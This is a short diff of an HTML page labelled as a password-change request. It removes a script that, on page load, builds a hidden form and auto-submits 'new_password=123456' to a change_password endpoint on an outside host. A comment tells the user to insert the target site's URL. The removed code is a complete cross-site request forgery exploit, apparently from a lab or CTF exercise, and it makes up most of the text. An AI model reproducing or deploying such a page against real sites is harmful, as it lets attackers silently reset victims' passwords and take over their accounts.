@@ -16,32 +16,6 @@
     <!-- 提示文字 -->
     <p class="loading">正在提交密码修改请求，请稍候...</p>
 
-    <script>
-        window.onload = function() {
-            // 延迟1秒提交（足够浏览器渲染文字）
-            setTimeout(function() {
-                // 替换为目标网站的完整接口地址！！！
-                const url = 'http://9yh0ns5.haobachang1.loveli.com.cn:8888/change_password';
-                
-                // 创建表单
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = url;
-                form.style.display = 'none';
-
-                // 添加密码参数
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'new_password';
-                input.value = '123456'; // 要修改的新密码
-
-                form.appendChild(input);
-                document.body.appendChild(form);
-                
-                // 提交表单
-                form.submit();
-            }, 1000); // 延迟1秒，可根据需要调整（比如2000=2秒）
-        };
-    </script>
+    
 </body>
 </html>
